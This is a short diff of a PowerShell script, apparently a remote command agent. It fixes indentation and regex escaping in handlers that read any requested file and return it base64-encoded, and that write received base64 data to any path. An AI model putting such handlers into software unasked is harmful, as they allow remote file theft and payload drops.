@@ -54,8 +54,8 @@ function Main {
     
         # Handle file download command
         elseif ($cmd.StartsWith("Get-Content")) {
-           try {
-               $filePath = $cmd -replace 'Get-Content -Path ', '' -replace ' -Encoding Byte', ''
+            try {
+                $filePath = $cmd -replace 'Get-Content -Path ', '' -replace ' -Encoding Byte', ''
                 $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
                 $response = [Convert]::ToBase64String($fileBytes)
             } catch {
@@ -68,14 +68,14 @@ function Main {
         # Handle file upload command
         elseif ($cmd.StartsWith("Set-Content")) {
             try {
-                $pattern = "Set-Content -Path (.+) -Value \[System.Convert\]::FromBase64String'(.+)' -Encoding Byte"
+                $pattern = "Set-Content -Path (.+) -Value `[System.Convert]::FromBase64String`'(.+)' -Encoding Byte"
                 if ($cmd -match $pattern) {
                     $filePath = $matches[1]
                     $fileContentBase64 = $matches[2]
                     $fileBytes = [Convert]::FromBase64String($fileContentBase64)
                     [System.IO.File]::WriteAllBytes($filePath, $fileBytes)
                     $response = "File uploaded successfully to $filePath"
-              } else {
+                } else {
                     $response = "Error: Invalid upload command format."
                 }
             } catch {
